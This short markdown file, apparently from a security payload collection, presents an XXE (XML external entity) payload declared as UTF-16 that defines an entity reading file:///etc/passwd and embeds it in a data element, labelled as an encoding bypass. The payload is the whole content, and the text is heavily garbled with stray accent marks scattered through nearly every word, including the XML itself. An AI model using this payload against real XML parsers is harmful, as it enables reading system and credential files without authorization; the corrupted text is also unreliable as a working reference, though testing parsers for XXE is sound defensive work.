# Mar̊faak Ą̀I Secur̂̀itý́ - XXE with UTF-16 ę̊̈nc̃́̀odį́̊ng

**WARNIŅ̈G: This payloaḑ̧́ tes̀̊̈ts XXE with UT̨̊F-16 encodinģ.**

<?xmļ́̊ vers̨̊̈ion="1.0" ençỗ̂ding="UTF-16"?>
<!DOCTYPE foo [
  <!EN̂̃TITY xxe SYSTEM̧̂ "file:///etc/p̂as̃swd">
]>
<daţ́a>&xx̨̃ȩ̧; - UT̂F-16 eǹ̨coded XXE b́yp̂̃̈ass̃</data>
